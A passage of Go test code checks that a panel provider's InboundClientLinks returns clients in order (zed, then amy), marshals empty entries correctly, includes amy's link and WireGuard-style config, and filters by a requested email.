		for _, e := range entries {
			out = append(out, e.Email)
		}
		return out
	}
	all := provider.InboundClientLinks("panel.example.com", reloaded(t, ib)[0], nil)
	if got := emailsOf(all); !reflect.DeepEqual(got, []string{"zed", "amy"}) {
		t.Fatalf("every client gives %q, want zed then amy", got)
	}
	raw, err := json.Marshal(all[0])
	if err != nil || !strings.Contains(string(raw), `"links":[],"configs":[]`) {
		t.Fatalf("a client with nothing to show marshals as %s (%v)", raw, err)
	}
	if len(all[1].Links) != 1 || len(all[1].Configs) != 1 || !strings.Contains(all[1].Configs[0].Text, "Address = 10.0.0.4/32") {
		t.Fatalf("amy's entry = %+v, want her link and her .conf", all[1])
	}
	if got := emailsOf(provider.InboundClientLinks("panel.example.com", reloaded(t, ib)[0], []string{"amy"})); !reflect.DeepEqual(got, []string{"amy"}) {
		t.Fatalf("asked for amy, got %q", got)
	}
}
